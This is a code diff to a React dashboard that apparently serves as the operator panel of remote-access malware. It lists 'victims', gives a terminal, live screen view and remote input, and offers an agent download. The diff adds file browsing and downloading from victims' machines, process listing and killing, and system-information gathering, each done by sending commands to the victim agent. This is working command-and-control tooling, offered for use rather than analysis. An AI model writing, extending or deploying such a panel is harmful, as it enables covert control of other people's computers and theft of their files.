@@ -8,6 +8,8 @@ import {
   CounterBadge,
   Input,
   Spinner,
+  Tab,
+  TabList,
   Text,
   makeStyles,
   tokens,
@@ -19,9 +21,16 @@ import {
   ChevronLeftRegular,
   ArrowDownloadRegular,
   TargetRegular,
+  CodeBlockRegular,
+  FolderRegular,
+  AppsListRegular,
+  InfoRegular,
 } from "@fluentui/react-icons";
 import { VictimCard } from "@/components/ui/VictimCard";
 import { Terminal } from "@/components/ui/Terminal";
+import { FileManager } from "@/components/ui/FileManager";
+import { ProcessManager } from "@/components/ui/ProcessManager";
+import { VictimInfo } from "@/components/ui/VictimInfo";
 import { ConnectionBadge } from "@/components/ui/ConnectionBadge";
 import { LogoutDialog } from "@/components/ui/LogoutDialog";
 import { getVictims, sendCommand, disconnectVictim, downloadMyAgent } from "@/lib/api";
@@ -119,6 +128,14 @@ const useStyles = makeStyles({
     display: "flex",
     flexDirection: "column",
   },
+  tabBar: {
+    marginBottom: "8px",
+    flexShrink: 0,
+  },
+  tabContent: {
+    flex: 1,
+    overflow: "hidden",
+  },
   empty: {
     display: "flex",
     flexDirection: "column",
@@ -149,7 +166,17 @@ export function DashboardContainer({
   const [liveFrame, setLiveFrame] = useState<string | null>(null);
   const [loading, setLoading] = useState(initialVictims.length === 0);
   const [search, setSearch] = useState("");
+  const [activeTab, setActiveTab] = useState<string>("terminal");
   const hasInitialData = useRef(initialVictims.length > 0);
+
+  // Per-victim data for tabs
+  // eslint-disable-next-line @typescript-eslint/no-explicit-any
+  const [fileBrowseData, setFileBrowseData] = useState<Record<string, any>>({});
+  // eslint-disable-next-line @typescript-eslint/no-explicit-any
+  const [processData, setProcessData] = useState<Record<string, any>>({});
+  // eslint-disable-next-line @typescript-eslint/no-explicit-any
+  const [sysinfoData, setSysinfoData] = useState<Record<string, any>>({});
+  const [tabLoading, setTabLoading] = useState<Record<string, boolean>>({});
 
   const styles = useStyles();
   const { user, token, logout, isLoading } = useAuth();
@@ -226,6 +253,33 @@ export function DashboardContainer({
         if (!msg.error) {
           setLiveFrame(msg.data ?? null);
         }
+      } else if (msg.type === "file_browse_result") {
+        setTabLoading((p) => ({ ...p, [`files_${msg.id}`]: false }));
+        if (!msg.error) {
+          setFileBrowseData((p) => ({ ...p, [msg.id]: msg.data }));
+        } else {
+          setOutput((p) => [...p, `[file_browse error] ${msg.error}`]);
+        }
+      } else if (msg.type === "process_list_result") {
+        setTabLoading((p) => ({ ...p, [`proc_${msg.id}`]: false }));
+        if (!msg.error) {
+          setProcessData((p) => ({ ...p, [msg.id]: msg.data }));
+        } else {
+          setOutput((p) => [...p, `[process_list error] ${msg.error}`]);
+        }
+      } else if (msg.type === "sysinfo_result") {
+        setTabLoading((p) => ({ ...p, [`info_${msg.id}`]: false }));
+        if (!msg.error) {
+          setSysinfoData((p) => ({ ...p, [msg.id]: msg.data }));
+        } else {
+          setOutput((p) => [...p, `[sysinfo error] ${msg.error}`]);
+        }
+      } else if (msg.type === "kill_process_result") {
+        if (msg.error) {
+          setOutput((p) => [...p, `[kill error] ${msg.error}`]);
+        } else {
+          setOutput((p) => [...p, `[+] ${msg.output}`]);
+        }
       }
     } catch {}
   }, [lastMessage, loadVictims, selected]);
@@ -239,6 +293,7 @@ export function DashboardContainer({
     setOutput([]);
     setLiveViewActive(false);
     setLiveFrame(null);
+    setActiveTab("terminal");
   }
 
   async function handleRemoteInput(action: string, x: number, y: number, key?: string) {
@@ -312,6 +367,59 @@ export function DashboardContainer({
       await sendCommand(selected.id, payload, token ?? undefined, commandType);
     } catch {
       setOutput((p) => [...p, "[error] Command delivery failed"]);
+    }
+  }
+
+  async function handleFileBrowse(path: string) {
+    if (!selected) return;
+    setTabLoading((p) => ({ ...p, [`files_${selected.id}`]: true }));
+    try {
+      await sendCommand(selected.id, path, token ?? undefined, "file_browse");
+    } catch {
+      setTabLoading((p) => ({ ...p, [`files_${selected.id}`]: false }));
+      setOutput((p) => [...p, "[error] Failed to browse files"]);
+    }
+  }
+
+  async function handleFileDownload(path: string) {
+    if (!selected) return;
+    setOutput((p) => [...p, `$ download ${path}`]);
+    try {
+      await sendCommand(selected.id, path, token ?? undefined, "download");
+    } catch {
+      setOutput((p) => [...p, "[error] Download failed"]);
+    }
+  }
+
+  async function handleProcessRefresh() {
+    if (!selected) return;
+    setTabLoading((p) => ({ ...p, [`proc_${selected.id}`]: true }));
+    try {
+      await sendCommand(selected.id, "", token ?? undefined, "process_list");
+    } catch {
+      setTabLoading((p) => ({ ...p, [`proc_${selected.id}`]: false }));
+      setOutput((p) => [...p, "[error] Failed to list processes"]);
+    }
+  }
+
+  async function handleKillProcess(pid: number) {
+    if (!selected) return;
+    setOutput((p) => [...p, `$ kill ${pid}`]);
+    try {
+      await sendCommand(selected.id, String(pid), token ?? undefined, "kill_process");
+    } catch {
+      setOutput((p) => [...p, `[error] Failed to kill process ${pid}`]);
+    }
+  }
+
+  async function handleSysinfoRefresh() {
+    if (!selected) return;
+    setTabLoading((p) => ({ ...p, [`info_${selected.id}`]: true }));
+    try {
+      await sendCommand(selected.id, "", token ?? undefined, "sysinfo");
+    } catch {
+      setTabLoading((p) => ({ ...p, [`info_${selected.id}`]: false }));
+      setOutput((p) => [...p, "[error] Failed to get sysinfo"]);
     }
   }
 
@@ -527,15 +635,68 @@ export function DashboardContainer({
               </Button>
             )}
             {selected ? (
-              <Terminal
-                victim={selected}
-                output={output}
-                onCommand={handleCommand}
-                onClear={() => setOutput([])}
-                liveViewActive={liveViewActive}
-                liveFrame={liveFrame}
-                onRemoteInput={handleRemoteInput}
-              />
+              <>
+                {/* Tab bar */}
+                <div className={styles.tabBar}>
+                  <TabList
+                    selectedValue={activeTab}
+                    onTabSelect={(_, d) => setActiveTab(d.value as string)}
+                    size="small"
+                  >
+                    <Tab value="terminal" icon={<CodeBlockRegular fontSize={14} />}>
+                      {!isMobile && "Terminal"}
+                    </Tab>
+                    <Tab value="files" icon={<FolderRegular fontSize={14} />}>
+                      {!isMobile && "Files"}
+                    </Tab>
+                    <Tab value="processes" icon={<AppsListRegular fontSize={14} />}>
+                      {!isMobile && "Processes"}
+                    </Tab>
+                    <Tab value="info" icon={<InfoRegular fontSize={14} />}>
+                      {!isMobile && "Info"}
+                    </Tab>
+                  </TabList>
+                </div>
+
+                {/* Tab content */}
+                <div className={styles.tabContent}>
+                  {activeTab === "terminal" && (
+                    <Terminal
+                      victim={selected}
+                      output={output}
+                      onCommand={handleCommand}
+                      onClear={() => setOutput([])}
+                      liveViewActive={liveViewActive}
+                      liveFrame={liveFrame}
+                      onRemoteInput={handleRemoteInput}
+                    />
+                  )}
+                  {activeTab === "files" && (
+                    <FileManager
+                      data={fileBrowseData[selected.id] ?? null}
+                      loading={!!tabLoading[`files_${selected.id}`]}
+                      onNavigate={handleFileBrowse}
+                      onDownload={handleFileDownload}
+                    />
+                  )}
+                  {activeTab === "processes" && (
+                    <ProcessManager
+                      data={processData[selected.id] ?? null}
+                      loading={!!tabLoading[`proc_${selected.id}`]}
+                      onRefresh={handleProcessRefresh}
+                      onKill={handleKillProcess}
+                    />
+                  )}
+                  {activeTab === "info" && (
+                    <VictimInfo
+                      data={sysinfoData[selected.id] ?? null}
+                      loading={!!tabLoading[`info_${selected.id}`]}
+                      onRefresh={handleSysinfoRefresh}
+                      victimId={selected.id}
+                    />
+                  )}
+                </div>
+              </>
             ) : (
               <div className={styles.empty}>
                 <DesktopRegular
